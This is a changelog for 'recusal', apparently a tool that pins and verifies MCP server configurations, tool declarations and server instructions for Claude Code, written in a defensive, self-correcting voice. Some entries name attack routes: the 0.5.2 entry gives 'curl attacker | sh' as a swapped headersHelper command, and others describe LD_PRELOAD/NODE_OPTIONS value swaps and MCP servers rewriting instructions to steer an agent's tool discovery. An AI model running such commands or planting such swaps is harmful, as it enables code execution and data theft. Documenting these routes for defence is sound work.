# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/), and the project adheres to
[Semantic Versioning](https://semver.org/).

## [0.5.9] - 2026-07-12

The single carry-forward item from the review sequence, pulled forward from 0.6.0 and
closed: manifest v6 models raw MCP declaration identity and Claude plugin callable
identity separately. Tightly scoped; the 0.5.8 boundaries are otherwise unchanged.

### Added
- **Manifest v6: explicit runtime identity (MANIFEST_VERSION = 6).** Each server
  entry carries a canonical `runtime: {"mode": "standard_mcp" | "claude_plugin"}`,
  declared explicitly (`build_manifest(runtime_modes=...)`, CLI
  `recusal mcp pin --claude-plugin NAME`) and never inferred from a key's spelling.
  In `claude_plugin` mode each tool pin stores its `callable_name`, derived by
  Claude's documented normalization (any character outside `A-Z a-z 0-9 _ -`
  becomes `_`, exposed as `recusal.mcp.plugin_callable_name`); the raw declaration
  name remains the pin key and fingerprint subject. Discovery and drift verification
  compare RAW identity; `PreToolUse` membership checks CALLABLE identity - so a
  spec-valid dotted plugin tool (`admin.tools.list`) pins and authorizes under
  Claude's spelling, and the raw dotted spelling is not treated as a callable. Two
  raw names normalizing to one callable REFUSE the pin (ambiguous callable identity
  certifies nothing); a `claude_plugin` server key must already be the callable-safe
  runtime segment (refused, never silently rewritten); the loader re-derives every
  stored `callable_name` and refuses mismatches, requires the canonical runtime
  record, and refuses `callable_name` on standard pins. Runtime identity lives in
  the manifest bytes, so it is inside the digest that audit provenance records.
- **Backward compatibility, explicitly**: manifest v5 is refused with a re-pin
  instruction naming the gap it predates (a plugin tool whose raw name requires
  normalization could be refused under Claude's spelling, or alias an approved
  callable); the call-time bridge fails closed on a v5 manifest, never open.

### Changed
- The plugin claim in the README is upgraded to match: full spec-valid plugin tool
  names are supported under the explicit plugin mode. The boundary that remains,
  stated as before: `PreToolUse` carries only the callable name, so a
  post-verification raw-declaration swap preserving an approved callable is
  indistinguishable at call time until the next `verify`, which now refuses on raw
  identity - exactly why both identities are pinned.

## [0.5.8] - 2026-07-12

A claim-correction patch from an eleventh external review, whose central finding was
a failure of OUR verification, not of the reviewed code: 0.5.7 published that Claude
does not document plugin callable-name normalization, when the rule IS explicitly in
the Claude Code MCP reference ("any character outside A-Z, a-z, 0-9, _, and - is
replaced with _"). The sweep missed it on the page it read, and the resulting text
also falsely rejected the tenth review's correct claim.

### Documentation
- **The plugin callable-name boundary corrected to the documented rule** (README,
  0.5.7 changelog entry, and published 0.5.7 release notes, all amended in place):
  plugin call-time mapping is supported only when the raw plugin, server, and tool
  components already use the callable-safe set; a statically pinned dotted name is
  refused at call time under Claude's normalized spelling; "false denial, never a
  false allow" is withdrawn (two raw names can normalize to one callable, so a
  post-verification raw-declaration swap can alias an already-approved callable name
  until the next verify reports the drift - the point-in-time boundary, sharpened
  for plugins and now stated with the `list_changed` residual); and the
  "observe and pin the exact runtime spelling" advice is withdrawn as not
  implementable (the manifest keys tools by raw declaration name). Raw-vs-callable
  identity modeling with collision refusal is required 0.6.0 scope (manifest v6).
- The `diff_observation` numbered contract states the all-servers-removed exception
  (`mcp_full_decommission_unsupported`) alongside the removal-warning rule.
- The CLI decommission test is renamed to what it actually proves (an
  unpinned-observation refusal) and asserts the precise full-decommission finding is
  NOT on that path: it is a library-level adjudication, and the CLI directs full
  decommission through manifest removal (Option B of the review's choice).

### Tests
- The alias residual is pinned as a demonstration: the approved callable spelling
  passes at call time (and would still pass after a live raw-declaration swap the
  hook cannot see), and the next verify refuses the swapped declaration as unpinned
  capability plus a removed pinned tool.

## [0.5.7] - 2026-07-12

A small correctness patch from a tenth external review (which found no P0 and
recommended folding these into 0.6.0; shipped now as 0.5.7 instead): all-servers-
removed semantics made deliberate, exception-contract consistency, and the plugin
callable-name boundary stated to exactly what the documentation establishes.

### Fixed
- **Full decommission refuses with the precise reason (P1).** Acknowledging removal
  of EVERY pinned server tripped the generic empty-observation refusal alongside the
  nonblocking removal warnings - safe-side, never a bypass, but inconsistent with the
  removal wording. Deliberate now: `removed` supports transitions where at least one
  pinned server remains observable; acknowledging all of them refuses with
  `mcp_full_decommission_unsupported`, naming the real decommission path (an empty
  observation certifies nothing, and the manifest keeps authorizing every pinned
  runtime name regardless - remove or replace the manifest itself: no pin, no MCP).
  Stated in the CLI help and verify docstring.
- **Malformed sequence members raise the documented `ValueError` (P1).** An
  unhashable member of `unverifiable`/`removed` (a list, a dict, a bytearray) raised
  `TypeError` from duplicate detection before its type was rejected. Element types
  now validate before duplicate detection; the 0.5.6 changelog's "fully strict" is
  amended in place.

### Documentation
- **The plugin callable-name boundary (P1).** *(Amended 2026-07-12, same day: as
  first published, this entry said Claude's docs "do not currently specify" the
  plugin callable normalization and rejected the tenth review's
  replace-with-underscore claim. That was OUR verification failure, not the
  review's error: the rule IS explicitly documented in the Claude Code MCP
  reference ("any character outside A-Z, a-z, 0-9, _, and - is replaced with _"),
  and the sweep missed it on the page it read. The eleventh review caught it.
  Consequences corrected with it: "false denial, never a false allow" was too
  strong - two raw names can normalize to the same callable, so a
  post-verification raw-declaration swap can alias an already-approved callable
  name until the next verify; and "observe and pin the runtime spelling" was not
  implementable, since the manifest keys tools by raw declaration name. The
  supported boundary is now stated exactly: plugin call-time mapping only for raw
  components already in the callable-safe set; raw-vs-callable identity modeling
  with collision refusal is 0.6.0 scope.)*
- The unified-verifier composition comment includes removal acknowledgements and
  whole-server inventory; the verify docstring's remote OAuth wording is
  per-transport (http/sse pin OAuth fields; ws is header-only).

## [0.5.6] - 2026-07-12

A narrowly scoped correctness patch mandated by a ninth external review: whole-server
observation completeness, strict observation-container validation,
manifest-before-business-policy ordering, reserved Claude server-name fidelity, and
the remaining MCP documentation corrections.

### Fixed
- **A wholly omitted pinned server refuses (P0).** `diff_observation` inherited
  `diff_manifest`'s absent-server WARNING for a pinned server missing from EVERY
  observation component, so a partial multi-server observation could verify clean
  while the manifest kept authorizing that server's pinned runtime names - a
  verification-coverage bypass for an existing pinned server (never a call-time
  name-authorization bypass). Now: a pinned server absent from every component is a
  CRITICAL refusal (`mcp_server_unobserved`); a deliberate removal is acknowledged
  explicitly (`McpObservation(removed=...)`, CLI `--removed NAME`), recorded as a
  passing WARNING naming the transition; `removed` may name only pinned servers and
  contradicts any representation; re-pinning without the server is the clean end
  state. The catalog-only `diff_manifest` primitive keeps its documented WARNING,
  because it claims only catalog comparison. A regression test demonstrates WHY: the
  omitted server's runtime tool name stays authorized by `manifest_policy` while the
  partial verification would have passed.
- **The observation structural contract validates the documented container types
  (P1).** *(Amended 2026-07-12: originally "fully strict" - a tenth review found one
  remaining exception-order edge: an unhashable sequence member raised TypeError from
  duplicate detection before its type was rejected. ValueError-consistent since
  0.5.7.)* `unverifiable` (and `removed`) accepted any iterable: a string iterated to characters, a dict to its
  keys, None raised `TypeError` instead of the documented `ValueError`. Both now
  require a list or tuple of unique nonempty names. Every source observation VALUE is
  structurally validated (`normalize_source`) before any comparison - including on
  unpinned, source-only, or catalog-less servers: the observation's structural
  contract does not depend on whether the manifest pins the server.
- **Manifest membership is established before the wrapped business policy runs (P1).**
  `manifest_policy` invoked the wrapped argument-level policy first, so an unapproved
  MCP capability (or a missing/corrupt manifest) still triggered downstream policy
  work - and adopter policies are not required to be side-effect-free (subject
  lookups, file reads, network evidence-gathering). Order now: non-MCP calls run the
  wrapped policy as before; MCP calls establish manifest availability and
  runtime-name membership FIRST; the wrapped policy runs only for pinned calls.
  Matches the docstring, which now also states that an unpinned call never invokes
  the wrapped policy.
- **Reserved Claude server names refuse before anything launches (P1).** Claude Code
  reserves `workspace`, `claude-in-chrome`, `computer-use`, `Claude Preview`, and
  `Claude Browser` for built-in servers, skips user config entries using them (with a
  warning), and rejects them in `claude mcp add`. The parser represented - and the
  pin path would launch - such entries. `servers_from_claude_config` now refuses a
  reserved name before classification or any command execution, one regression test
  per documented name proving no marker command runs. The list mirrors current
  documented Claude behavior and is maintained as Claude adds reserved names.

### Documentation
- **SSE OAuth corrected**: 0.5.5 said Claude's docs "are silent on SSE" - the
  reference states its preconfigured OAuth flags "only apply to HTTP and SSE
  transports". The affirmative form now appears in the source comments, README, and
  the amended 0.5.5 changelog entry, with SSE's upstream deprecation in favor of
  HTTP noted; the README's earlier http/sse/ws-all-pin-OAuth phrasing and the later
  http-only phrasing were internally inconsistent and both now read: OAuth policy
  fields pin for `http`/`sse`; `ws` is header-only and refuses.
- **MCP roots named out of scope**: Recusal does not pin or govern `roots/list`
  responses (the session launch directory plus additional working directories) or
  `notifications/roots/list_changed`; Claude working-directory permissions,
  additional-directory configuration, server-side root enforcement, and OS controls
  own that boundary (README and SECURITY).
- **Manifest-v5 terminology finished**: the `recusal.mcp` module heading reads "tool
  and server-instruction integrity" (not "tool-catalog governance"); the README
  discovery heading and verify comment name instructions alongside declarations;
  "verify proves the catalog" reads as the full represented source, instruction, and
  declaration scope plus the new whole-server inventory rule; the stdio collector
  states it contacts no HTTP/SSE/WebSocket server; `servers_from_claude_config`
  documents OAuth as transport-specific.

## [0.5.5] - 2026-07-12

A narrowly scoped correctness patch mandated by an eighth external review:
complete-observation validation, malformed-event provenance reset, canonical tool-pin
fields, and WebSocket configuration fidelity.

### Fixed
- **`McpObservation` is a strict complete-observation contract (P0).** As shipped in
  0.5.4, `diff_observation` compared only the components the caller supplied: omitting
  `sources` bypassed launch/remote identity entirely (matching catalog plus matching
  instructions passed against a pin that carries a stdio or HTTP source), a truthy
  non-bool `observed` was coerced to "observed", falsey catalog values normalized to
  empty tool lists (a malformed observation read as a mere shrunk-set WARNING), and
  servers appearing only in `sources`/`instructions`/`unverifiable` escaped
  adjudication. Now the observation's own shape is validated before any comparison
  (`ValueError` on malformation: non-list catalog values, non-bool `observed`,
  records other than exactly `{"observed": bool, "text": str|None}`, duplicate or
  empty `unverifiable` names), every catalog server requires an explicit source
  observation (`mcp_source_unobserved` CRITICAL; the dump path's explicit weak claim
  is `{"transport": "external"}`, never an omission) and an explicit instruction
  record (the legacy weaker claim is the explicit `{"observed": false, "text": null}`),
  an unpinned server in ANY component is a CRITICAL refusal, and a pinned server
  represented only partially must be named `unverifiable` or is refused as an
  incomplete observation. `diff_manifest` refuses malformed catalog values
  (`mcp_malformed_catalog`) instead of truthiness-normalizing them. The named
  boundary: a server the observation does not represent at all is still only the
  pinned-server-absent WARNING, because an observation cannot prove the absence of
  servers it never looked at - collect against the full config, as the CLI does.
- **A malformed hook event cannot inherit prior manifest provenance (P0).** The
  ContextVar reset ran only when the policy executed, and a malformed event fails
  BEFORE the policy runs - so in a reused process (one thread, one policy object) a
  malformed event's audit record inherited the digest of the last valid adjudication.
  `manifest_policy` now exposes `reset_control_identity()`, and
  `run_pretooluse_hook` calls it before parsing the envelope: an event that never
  reached the policy never carries the policy's provenance. Regression-tested across
  six malformed-envelope shapes, in fail-closed and fail-open modes, and with the
  first call unaudited. (Claude Code's command hooks run a fresh process per
  invocation; this affected the reusable library path.)
- **Tool pins are fully canonical (P1).** A pin is exactly
  `{"fingerprint": ..., "fields": {...}}` - a missing `fields` member refuses, and
  `fields` names must come from the tracked diagnostic set (an undefined field hash
  has no defined diagnostic meaning). Schema integrity: the complete tool fingerprint
  was already the authoritative declaration-integrity value.
- **WebSocket sources are header-only (P1).** Claude Code documents that HTTP
  supports OAuth "while WebSocket supports neither" (ws authentication is
  header-only), but the parser accepted and pinned `oauth` for `ws` entries - a shape
  Claude does not support, misrepresenting the mirrored configuration surface. A `ws`
  entry or source carrying `oauth` now refuses in both `.mcp.json` parsing and
  `normalize_source`, and the canonical ws source shape carries no `oauth` member at
  all. *(Amended 2026-07-12: this originally said the docs "are silent on SSE".
  Claude's reference states its preconfigured OAuth flags "only apply to HTTP and
  SSE transports", so `sse` keeps the OAuth shape affirmatively, noting SSE is
  deprecated upstream in favor of HTTP.)* Existing ws pins, if any, re-pin under the
  corrected shape.

### Documentation
- 0.5.4's overstatements amended in place (changelog and published release notes):
  "the final 0.5.x correctness patch" (history describes, it does not predict),
  "omission-resistant on every public verification path", the review-7
  no-corrections claim (this release's own parser carried the ws-oauth mismatch),
  and "complete transitive build+publish closure" narrowed to the Python build and
  metadata-check environment (publishing is a separately SHA-pinned action via
  Trusted Publishing, outside the Python lock - so stated in the lock header and
  workflow too).
- The README module table names server-instruction integrity and the outside-manifest
  list alongside the tool catalog; the ws header-only boundary is stated with the
  OAuth scope boundary; the last unqualified determinism shorthand ("same evidence,
  same policy, same version, same verdict" in the demo section) is fully qualified;
  and the pin CLI help names tool declarations, server instructions, and source
  configuration warnings instead of "descriptions".

## [0.5.4] - 2026-07-12

A correctness and release-rigor patch mandated by a seventh external review: unified
manifest-v5 observation verification, rich single-server instruction observations
preserved, normal manifest-policy provenance made context-local under concurrent
reuse, manifest schemas tightened, and the Python build environment hash-locked.
*(Amended 2026-07-12: this introduction originally said "the final 0.5.x correctness
patch", claimed the verify was "omission-resistant on every public verification path"
- an eighth review showed source identity could still be omitted and component shapes
were not validated - and called review 7 "the first whose Claude-behavior claims all
verified without correction", while 0.5.4's own parser accepted OAuth for WebSocket
entries, a shape Claude documents as unsupported. Release history describes what
changed; it does not predict that no further correction will be found. See 0.5.5.)*

### Fixed
- **A unified manifest-v5 verify: `diff_observation` (P0).** *(Amended 2026-07-12: as
  shipped in 0.5.4 this was omission-resistant for server-INSTRUCTION coverage only;
  source-observation omission and component-shape validation were closed in 0.5.5.)*
  `diff_manifest` is catalog-only, so a programmatic caller could verify unchanged
  tools and read the clean result as a full v5 verify while the server's instructions
  had been rewritten - the CLI composed the three primitives correctly, but the public
  library path did not guarantee it. `diff_observation(pinned, McpObservation(...))`
  now validates the manifest and compares sources, instruction state, tool catalog,
  and unverifiable servers in one call; a pin WITH instruction coverage verified
  against an observation carrying none is a CRITICAL refusal
  (`mcp_instructions_unobserved`), never a silent pass, so omitting the instruction
  observation cannot weaken the verify. `recusal mcp verify` routes through it, the
  CLI and library are pinned to agree on blocking outcomes, and `diff_manifest` is
  documented as the deliberate catalog-only primitive.
- **Rich single-server `--from` observations keep their instructions (P0).** With
  `--server NAME`, a dump carrying `{"instructions": ..., "tools": [...]}` had its
  instructions silently discarded and recorded as `observed: false` - a supplied
  stronger observation downgraded to the weaker claim. The key now decides: absent =
  not observed (legacy tools/list result), present-null = observed and the server
  declares none, string = observed and pinned; a non-string refuses. Added, changed,
  and removed instructions are each regression-tested through the single-server path,
  and the CLI help documents the rich shape and the weaker legacy claim.
- **Audit manifest provenance is invocation-local under concurrency (P0).**
  `manifest_policy` carried its verified digest on a mutable policy-object attribute:
  correct sequentially, but two threads sharing one policy object could
  cross-contaminate audit provenance (one invocation's clear erasing the digest
  another was about to record). The digest now lives in a `ContextVar` (isolated per
  thread and per asyncio task), read by the audit layer through the policy's
  `get_control_identity()`; a plain `last_manifest_digest` attribute is still honored
  for custom policy objects and documented as a sequential-only seam. Deterministic
  barrier-interleaved tests prove each audit record sees exactly the digest its own
  invocation verified, that a concurrent non-MCP call records none, and that a
  concurrently-corrupted manifest is never recorded as enforced.
- **Only canonical manifest shapes load (P1).** The loader accepted
  `server_instructions` encodings the builder never emits (`present` under
  `observed: false`, a fingerprint under `present: false`, extra keys) and ignored
  unknown fields at the manifest top level, server entries, and tool pins. A
  deterministic control artifact must not carry fields whose meaning is undefined:
  exactly the three canonical instruction shapes are accepted, and undefined fields
  refuse at every level.

### Changed
- **The release build environment is hash-locked.** `release-requirements.txt` pins
  the Python build and metadata-check dependency environment for the release runner
  (ubuntu/cp312, 33 packages) with the sha256 of every distribution file PyPI serves
  per release *(amended 2026-07-12: originally "the complete transitive build+publish
  closure" - publishing is performed by a separately SHA-pinned GitHub Action via
  Trusted Publishing, outside this Python lock)*;
  the release workflow installs it with `--require-hashes` and builds with
  `--no-isolation`, so no unpinned PEP 517 resolution happens in the release path. A
  CI job proves the locked environment installs and builds on every push, before any
  tag exists. Drift locks pin the lock to pyproject's hatchling and the workflows to
  the lock. Stated narrowly: this pins what installs in the release environment; it
  does not make the build byte-reproducible (untested), and pip on the runner image is
  outside the lock.
- The release workflow verifies the built wheel from a neutral directory (from the
  repo root, `import recusal` finds the checkout and proves nothing about the wheel),
  and its version-mismatch message names the actual version source
  (`recusal/__init__.py`, not "pyproject").

### Documentation
- **0.5.3's own overstatements corrected in place** (changelog and published release
  notes): "the last uncovered MCP discovery-content surface" and "every statement
  that exceeded the implementation corrected" were absolute completion language of
  exactly the kind that release existed to remove.
- **Tool Search qualified everywhere**: tool names and server instructions load at
  session start *under Claude Code's default tool-search behavior*, and full
  definitions may load up front when tool search is disabled or falls back, when a
  server sets `alwaysLoad`, or when a tool declares `anthropic/alwaysLoad`.
  `alwaysLoad` is named a context-loading policy field (it changes what enters model
  context), shape-validated but deliberately excluded from source identity; a
  tool-level `anthropic/alwaysLoad` inside a declaration IS part of its fingerprint.
- **Instruction hashing vs Claude truncation documented**: Recusal fingerprints the
  complete observed instruction string while Claude truncates loaded context
  (currently 2KB each for instructions and tool descriptions), so a change outside
  the loaded prefix still drifts - the safe side of the asymmetry.
- **The hook exit-code contradiction removed**: the normal refusal is exit 0 WITH
  `permissionDecision: "deny"` JSON (honored as a block); exit 2 is the blocking
  failure signal; only *other* nonzero exits are non-blocking, which is precisely the
  gap the launcher's coercion closes. "Anything other than exit 2 is non-blocking" no
  longer appears.
- **OAuth boundary stated exactly**: the pin records configured policy fields
  (including the configured `scopes` string, whose change is drift); it does not
  observe the final authorization request, scopes Claude appends (such as
  `offline_access`), the issued token, granted authority, or server-side
  authorization results.
- The discovery boundary row reads `initialize.instructions` + `tools/list`; the
  remote instruction-coverage requirement (rich `--from` shape) is stated prominently;
  SECURITY.md's MCP row covers manifest v5, the full outside-the-artifact list, and
  the call-time name-membership boundary; the 0.5.2 changelog's plugin
  exact-implementation and hook-timeout-non-blocking claims are amended in place; the
  remaining "same evidence, same verdict" shorthand is fully qualified (same
  normalized evidence and policy inputs, same recusal version) in README,
  CONSTITUTION, FAQ, WHY, and the package docstring; LANDSCAPE is scoped as a dated
  documentation review with no market-exhaustiveness or absence claims; and the
  pin-refusal operator message names declarations, instructions, AND source warnings.

## [0.5.3] - 2026-07-12

The correctness and claim-boundary release mandated by a sixth external review, before
any 0.6.0 work: audit provenance made authoritative, the server-instruction gap that
review identified added to manifest v5, and the specific overstatements it named
corrected (the completion language, the stale v3 shapes, the layered-diagram order,
the timeout claim, the exit-code semantics, the scope lists; the itemized list is the
Documentation section below). *(Amended 2026-07-12: this introduction originally said
"the last uncovered MCP discovery-content surface" and "every statement that exceeded
the implementation corrected" - absolute completion language of exactly the kind this
release existed to remove. A seventh review found further gaps; see 0.5.4.)*

### Fixed
- **Audit control identity is authoritative (P0).** Caller-supplied `control=` values
  for `recusal_version` and `manifest_sha256` were merged AFTER the implementation's
  values, so a caller could forge both - provenance theater, not provenance. Reserved
  keys are now stripped from caller input and always written by the implementation;
  one `_control_identity` helper serves every audit path including the fail-open
  malformed-event record; `manifest_policy` records its digest only AFTER successful
  parse and validation (a corrupt manifest is never recorded as enforced) and clears it
  per invocation (a non-MCP call through the same policy object never inherits a
  previous call's manifest provenance). Each failure mode is regression-tested.
- **Manifest v5: server instructions are pinned (P0).** With Claude Code's default
  tool-search behavior, tool names and server INSTRUCTIONS load at session start while
  full tool definitions are deferred (full definitions may load up front when tool
  search is disabled or falls back, when a server sets `alwaysLoad`, or when a tool
  declares `anthropic/alwaysLoad`), so a server that keeps `tools/list` byte-identical
  and rewrites only its initialize-result `instructions` steers discovery invisibly to
  v4. The fetcher now
  observes instructions, the pin screens them with the same bounded marker/size review
  as declarations, they are stored as a hash (never readable text), and added, removed,
  or changed instructions are CRITICAL drift. A legacy `{server: [tools]}` dump is
  recorded as `observed: false`, keeps that weaker claim honestly, and an observation
  that later carries instructions refuses with a re-pin instruction - unreviewed
  influence content cannot ride in on a collector upgrade. The rich `--from` shape is
  `{"instructions": ..., "tools": [...]}`; v4 manifests are refused with a re-pin
  instruction.
- **Runtime-only config fields are validated (P1).** `timeout` must be an integer of at
  least 1000 milliseconds (Claude ignores smaller values, and a silently ignored value
  must not read as faithfully represented) and `alwaysLoad` a boolean; malformed values
  refuse. OAuth shapes are tightened: `callback_port` must be a real TCP port, a
  literal `auth_server_metadata_url_template` must be https (a `${VAR}` template stays
  unexpanded; the resolved scheme is Claude's to enforce), and `scopes` must be a
  nonempty, duplicate-free space-separated set.

### Changed
- **One Python version source.** The package version lives only in
  `recusal/__init__.py` (hatch reads it via `[tool.hatch.version]`); a literal in
  pyproject is drift-locked out by test. Plugin/marketplace JSON keep literals (JSON
  cannot import Python) under the existing drift locks.
- **The release build toolchain is pinned** (`hatchling==1.27.0`, the newest that
  still supports Python 3.9, plus `build==1.5.1` and `twine==6.2.0`), reviewed and
  bumped deliberately like the action SHAs. Stated
  narrowly: this pins the top-level toolchain versions; full hash-locked dependency
  trees, attestations, and an SBOM remain 0.6.0 supply-chain scope.
- The plugin's shipped policy declares `policy_version` alongside `policy_id`.

### Documentation
- **Completion language removed.** 0.5.2's "architecture closure" / "implemented
  completely" is amended in place and in the published release notes; the accurate
  description is architecture hardening with named boundaries. The plugin claim is
  precisely "declared-version binding" (it does not attest package bytes or a modified
  package retaining the version string), and its quick-start pins the exact version.
- **Semantics corrected to the documented Claude behavior**: the layered diagram now
  shows `PreToolUse` running BEFORE the native permission prompt (deny-wins precedence
  noted); the deny path is exit 0 with `permissionDecision: "deny"` JSON while the
  launcher's exit-2 coercion covers gate-process failures (the "every failure mode"
  claim is narrowed to the four modes the launcher actually closes); the hook-timeout
  authorization outcome is stated as NOT independently established rather than assumed
  non-blocking; the effective-MCP-environment scope names every Claude state it does
  not reconstruct; plugin MCP naming gets the exact worked example
  (`plugin_my-plugin_database-tools` as the server key); declared policy identity is
  named as caller-supplied labels; stale v3 "header names" descriptions are corrected
  or labeled historical; "hashes only" reads "declarations and instructions as hashes,
  source templates readable" everywhere; the remaining "same evidence, same verdict"
  shorthand carries the policy/version qualifier; categorical competitor claims,
  percentage estimates, and roadmap language are removed from LANDSCAPE/WHY/FAQ/PROVEN;
  and the cookbook dumper emits the rich instructions-bearing observation shape.

## [0.5.2] - 2026-07-12

The architecture-hardening release, driven by a fifth external review: it closes the
manifest-v3 remote configuration gaps, adds declared-version binding for the Claude
plugin, adds audit control metadata, and documents the remaining Claude and MCP
boundaries. (This section originally said "architecture closure" and "implemented
completely"; the sixth review showed that overstated it - audit control fields were
caller-overridable, server instructions were unpinned, and plugin binding is
declared-version, not byte attestation. 0.5.3 addresses each.)

### Added
- **Manifest version 4: remote authentication identity.** Remote sources now pin header
  value TEMPLATES (a same-name `Authorization` swap between `${READ_ONLY_TOKEN}` and
  `${ADMIN_TOKEN}` is drift - v3 pinned header names only and passed it), the
  `headersHelper` command template (Claude executes it at connect time; it was
  previously invisible to verification entirely, so an approved token script could be
  swapped for `curl attacker | sh` without drift), and the OAuth policy surface
  (`client_id`, `callback_port`, `auth_server_metadata_url_template`, `scopes` - the
  scope set is the native mechanism constraining requested authority, and widening it
  is now drift). Resolved credentials and client secrets never appear in a pin, and
  neither do hashes of them. `timeout` and `alwaysLoad` are classified runtime-only:
  allowed, deliberately not identity. A field the parser cannot classify fails closed -
  an unclassified field could be executable configuration (exactly how `headersHelper`
  was once dropped silently). v3 manifests are refused with a re-pin instruction.
- **Audit control identity.** Every hook audit entry now records the recusal package
  version automatically, caller-declared policy identity via
  `run_pretooluse_hook(control={"policy_id": ..., "policy_version": ...})`, and the
  manifest content digest a `manifest_policy` enforced. A verdict is replayable only
  when the adjudication rules are identifiable: same evidence is insufficient if the
  policy changed.
- **The plugin is bound to its adjudicator's declared version.** The plugin gate
  refuses (fail closed, versions named) when the importable recusal package version
  differs from the plugin's expected version; a drift-lock test keeps shim, plugin
  manifest, and package versions equal. *(Amended 2026-07-12: this originally said the
  plugin identity "names the exact implementation that decides". The control is
  declared-version binding: it detects a version-string mismatch but does not attest
  package bytes or installation provenance.)*
- **Secret-template review screen.** Pin-time machine-readable WARNINGs for literal
  header values (`mcp_header_literal`), secret-bearing `${VAR:-default}` defaults
  (`mcp_template_default`), and literal values following credential-shaped argument
  flags (`mcp_arg_secret`) - a deny-list with a deny-list's ceiling, surfacing the
  obvious for review, never claiming secret detection.

### Changed
- **A remote-only pin no longer demands `--approve-server-launch`.** Approval is
  required exactly when a stdio process would execute; parsing the config is safe and
  happens first.
- **Terminology narrowed to what is implemented**: "MCP tool-catalog governance" (not
  "MCP discovery governance"), "the three MCP tool-call boundaries", and "the manifest
  stores tool declarations as hashes; source templates are stored readable" (not
  "hashes only"). "Same evidence, same policy, same version, same verdict" became the
  wording everywhere. *(Since 0.5.4 the fully qualified form is used: the same
  normalized evidence and policy inputs, under the same recusal version, produce the
  same verdict.)*

### Documentation
- **The layered Claude architecture is stated up front**: Recusal is the deterministic
  policy and adjudication layer inside Claude Code's stack (managed policy, native
  permissions, sandboxing, MCP authentication), not a replacement for any of it.
- **Scope, stated exactly**: Recusal verifies the supplied configuration artifact, not
  Claude Code's effective MCP environment across local/user/plugin/managed/connector
  scopes (constrain those with Claude managed MCP policy); it governs MCP tools, not
  prompts/resources/channels/elicitation; verification is point-in-time under dynamic
  `list_changed`; remote authentication and transport belong to Claude or the client
  producing the `--from` dump; plugin-bundled MCP servers use scoped runtime names
  (`mcp__plugin_<plugin>_<server>__<tool>`) and are governed by pinning that full name.
- **The hook-timeout residual is named**: Claude cancels a hook at the configured
  timeout (default 600s); shipped policies adjudicate in milliseconds, and a SHORT
  per-hook timeout would widen any fail-open window, not close it. *(Amended
  2026-07-12: this originally asserted the documentation "treats timeouts as
  non-blocking". Claude documents the cancellation, but this repository has not
  independently established the resulting authorization outcome for the launcher.)*
- **Production runtime pinning documented**: a dedicated venv with an exact
  `recusal==<version>`, registered explicitly and protected from agent writes.
- Guardrail and agent-framework comparisons corrected to the precise, defensible form;
  the 0.5.1 changelog's "whole execution-relevant surface" claim is amended in place.

## [0.5.1] - 2026-07-12

The trustworthiness patch, driven by a fourth external review of 0.5.0: the source
artifact now represents every supported server entry in the supplied `.mcp.json`,
including remote transport and URL identity, adds environment value-template integrity
for stdio servers, and every confirmed correctness finding is fixed. (Remote header
value templates, headersHelper, and OAuth configuration joined source identity in
0.5.2's manifest v4; this section originally claimed the "whole execution-relevant
surface", which overstated v3.)

### Fixed
- **Every configured server is verified, remote transports included (P0).** `.mcp.json`
  is parsed by transport TYPE with Claude Code's rules: `http`/`streamable-http`/`sse`/
  `ws` entries are first-class identities pinned as `{transport, url_template,
  header_keys}` (manifest v3 behavior at the time of 0.5.1; v4 later replaced
  header names with header value templates); an added unpinned remote server, a
  transport swap, a URL without a type, an unsupported type, or a remote entry carrying
  stdio launch fields each fail closed - previously a remote entry was a silently
  skipped name, so an attacker could add `{"type": "http"}` exfiltration to the config
  and verify still passed. A mixed pin now refuses unless `--from` supplies the remote
  catalogs: a partial pin must not read as a full one.
- **Environment value templates are pinned (P0; manifest version 3).** v2 pinned env
  variable *names* only, so a same-key value swap in the config - `NODE_OPTIONS`,
  `LD_PRELOAD`, `PYTHONPATH` - passed the preflight and executed attacker code at
  launch. v3 pins the as-written value templates: a config-level value change or
  `${VAR}` reference rename is drift, refused before launch. Resolved values still
  never appear in a pin; a LITERAL env value does become manifest content, named at pin
  time as a JSON-visible WARNING (`mcp_env_literal`) with the fix (use `${VAR}` for
  secrets). The residual is narrowed and pinned as a test: the operator-shell value
  behind a `${VAR}` reference is not the config's to pin. v1 and v2 manifests are
  refused with re-pin instructions.
- **`recusal init --repair-launcher` migrates pre-0.4.2 Windows installs.** `init` treats
  any existing recusal hook as already-installed, so doctor's old remediation ("re-run
  init") changed nothing on hosts whose POSIX launcher fails OPEN under the PowerShell
  fallback. The repair recognizes exactly the canonical launchers, replaces them with
  the host-appropriate entries, preserves custom hooks and every other setting, never
  touches the gate policy file, and is a no-op the second time. Doctor now recommends it.
- **`verify(entries, expected_head=...)` returns a named failure on a non-object final
  record** instead of raising - the anchor exists precisely to catch a mangled tail.
- **The manifest-policy cache is thread-safe**: (digest, names) is one immutable pair
  swapped under a lock, and the returned names are always derived from the bytes the
  same call read, so a multi-threaded runtime can never observe one manifest's digest
  associated with another manifest's authorization set.
- **The observer's peak memory matches its budget claim**: the reader thread reserves
  against the total-character budget BEFORE enqueueing and the queue holds at most 4
  lines - previously the budget was charged on dequeue, so a hostile server could park
  queue-times-line-cap (multi-GB) in memory before the limit fired.
- **The GitHub Action aggregates every gate**: GitHub runs `shell: bash` with fail-fast,
  which aborted the script at the first failing gate before `bump $?` ran; `set +e` now
  precedes the aggregation, so every selected gate runs and the highest exit code wins
  (drift-locked by a test).
- **Protocol strictness**: a matching response without the `jsonrpc: "2.0"` envelope,
  or an `initialize` result without a named `serverInfo` object or a `tools` capability
  *object*, refuses. One monotonic `observation_timeout` (default 300s) spans
  initialize plus all pagination, so a server answering just inside each per-request
  deadline cannot stretch an observation to ~101x the timeout.
- **`build_manifest` refuses an empty tool name** (it previously wrote an artifact its
  own loader rejects), an explicitly supplied invalid source raises instead of silently
  downgrading to external, an external source carrying stdio fields is contradictory
  and refused, and falsey malformed config values (`"args": ""`, `"env": []`) are
  rejected instead of being coerced to empty defaults.

## [0.5.0] - 2026-07-12

The MCP launch-template-integrity release: the pin now covers the approved stdio launch
template used to request the catalog, not only the declarations it returns, closing the
command and argument substitution path named as the highest-priority trust gap. (This
section originally said "execution identity" and "WHAT PROCESS"; that overstated it.
What v2 proves is launch-TEMPLATE integrity: command template, argument templates, cwd,
and env variable names. Environment values, PATH/registry resolution, executable bytes,
and remote transport identity are not attested; see the residuals below.)

### Added
- **Manifest version 2: launch specifications are pinned and compared BEFORE launch.**
  Each server pinned from `--stdio`/`--claude-config` records its launch identity - the
